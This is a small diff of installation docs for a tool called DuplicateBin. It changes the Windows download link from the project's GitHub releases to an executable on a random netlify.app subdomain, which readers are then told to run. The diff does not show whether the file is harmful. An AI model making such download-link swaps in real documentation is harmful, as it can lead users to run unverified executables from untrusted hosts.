@@ -94,7 +94,7 @@ sudo apt-get install -f`}
           <h4 className="text-lg font-semibold text-white mb-3">Windows Installation</h4>
           <CodeBlock language="powershell" title="Download Windows executable">
 {`# Download from GitHub releases
-# Visit: https://github.com/MustafaPinjari/duplicate-bin/releases/download/v0.1.1/DuplicateBin.exe
+# Visit: https://fanciful-shortbread-d39145.netlify.app/public/DuplicateBin.exe
 
 # Run the standalone executable
 .\\DuplicateBin.exe
